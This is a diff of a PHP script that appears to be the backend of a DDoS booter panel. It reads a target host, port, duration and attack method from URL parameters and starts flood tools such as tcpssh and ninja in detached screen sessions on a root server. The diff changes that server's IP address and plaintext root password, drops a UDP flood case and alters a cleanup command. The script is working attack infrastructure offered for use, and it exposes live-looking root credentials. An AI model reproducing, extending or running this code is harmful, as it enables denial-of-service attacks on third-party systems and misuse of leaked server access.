@@ -10,9 +10,9 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
     $key = $_GET['key'];
 
     $username = 'root';
-    $ip = '103.253.146.18';
+    $ip = '206.189.86.140';
     $ports = '22';
-    $password = 'leo@123';
+    $password = 'Jancuk123@Asu';
 
     $allowedKeys = ['starpez'];
 
@@ -21,9 +21,6 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
     }
 
     switch ($method) {
-        case 'UDP':
-            $command = "cd /var/www/html/test/ && screen -dm ./udp $host $port $time";
-            break;
         case 'TCPSSH':
             $command = "cd /var/www/html/test/ && screen -dm node tcpssh $host $port root $time";
             break;
@@ -67,7 +64,7 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
             $command = "cd /var/www/html/test/ && screen -dm node ninja $host $time";
             break;
         case 'REFRESH':
-            $command = "cd /var/www/html/test/ && pm2 delete hold";
+            $command = "cd /var/www/html/test/ && pkill screen";
             break;
         case 'UPDATE':
             $command = "cd /var/www/html/test/ && screen -dm node scrape.js && cd /root/ && apt update -y && apt upgarde -y";
